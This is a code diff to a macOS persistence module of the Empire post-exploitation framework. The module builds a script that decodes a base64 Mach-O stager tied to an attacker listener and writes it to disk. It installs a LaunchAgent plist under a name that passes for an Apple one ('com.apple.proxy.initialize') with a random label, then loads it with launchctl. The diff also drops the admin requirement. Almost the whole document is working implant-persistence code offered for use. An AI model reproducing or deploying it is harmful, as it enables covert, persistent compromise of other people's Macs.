@@ -1,4 +1,5 @@
 import base64
+import os
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -9,10 +10,10 @@ class Module:
             'Name': 'LaunchDaemon',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@xorrior', '@malcomvetter', '@h1ghtopfade', 'notcharles'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an EmPyre launchDaemon.'),
+            'Description': ('Installs an Empire launchDaemon.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -21,7 +22,7 @@ class Module:
             'OutputExtension' : None,
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : True,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
@@ -64,12 +65,12 @@ class Module:
             'DaemonName' : {
                 'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                 'Required'      :   True,
-                'Value'         :   'com.proxy.initialize'
+                'Value'         :   'com.apple.proxy.initialize'
             },
-            'DaemonLocation' : {
-                'Description'   :   'The full path of where the EmPyre launch daemon should be located.',
+            'DaemonPath' : {
+                'Description'   :   'The relative path of where the Empire launch daemon should be located.',
                 'Required'      :   True,
-                'Value'         :   ''
+                'Value'         :   'Library/LaunchAgents/'
             }
         }
 
@@ -91,8 +92,9 @@ class Module:
     def generate(self):
 
         daemonName = self.options['DaemonName']['Value']
-        programname = self.options['DaemonLocation']['Value']
-        plistfilename = "%s.plist" % daemonName
+        daemonPath = self.options['DaemonPath']['Value']
+        # add trailing slash if not present
+        daemonPath = os.path.join(daemonPath, '')
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
@@ -101,70 +103,86 @@ class Module:
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
 
-        plistSettings = """
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>%s</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>%s</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>
-""" % (daemonName, programname)
-
         script = """
 import subprocess
 import sys
 import base64
 import os
+import string
+import random
+
+def label_generator(size=6, chars=string.ascii_uppercase + string.digits):
+        return ''.join(random.choice(chars) for _ in range(size))
+
+my_env = os.environ.copy()
+username = my_env["USER"]
 
 encBytes = "%s"
 bytes = base64.b64decode(encBytes)
-plist = \"\"\"
-%s
-\"\"\"
 daemonPath = "%s"
+daemonName = "%s"
+fullPath = "/Users/" + username + "/" + daemonPath
 
-if not os.path.exists(os.path.split(daemonPath)[0]):
-    os.makedirs(os.path.split(daemonPath)[0])
+plist = \"\"\"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+        <key>KeepAlive</key>
+        <false/>
+        <key>Label</key>
+        <string>||label||</string>
+        <key>Program</key>
+        <string>||fullPath||||daemonName||</string>
+        <key>ProgramArguments</key>
+        <array>
+                <string>||fullPath||||daemonName||</string>
+        </array>
+        <key>LaunchOnlyOnce</key>
+        <true/>
+        <key>RunAtLoad</key>
+        <true/>
+</dict>
+</plist>\"\"\"
 
 
-e = open(daemonPath,'wb')
+plist = plist.replace("||daemonName||", daemonName)
+plist = plist.replace("||fullPath||", fullPath)
+plist = plist.replace("||label||", label_generator(15))
+
+
+if not os.path.exists(fullPath):
+    os.makedirs(fullPath)
+
+
+e = open(fullPath + daemonName,'wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath, 0777)
+os.chmod(fullPath + daemonName, 0777)
+plistFilename = fullPath + daemonName + ".plist"
 
-f = open('/tmp/%s','w')
+f = open(plistFilename,'w')
 f.write(plist)
 f.close()
 
-process = subprocess.Popen('chmod 644 /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chmod 644 ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown -R root /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown -R root ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown :wheel /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown :wheel ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('launchctl unload ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('launchctl load ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
-print "\\n[+] EmPyre daemon has been written to %s"
+print "\\n[+] Persistence has been installed: " + plistFilename
+print "\\n[+] Empire daemon has been written to " + fullPath
 
-""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
+""" % (encBytes, daemonPath, daemonName)
 
         return script
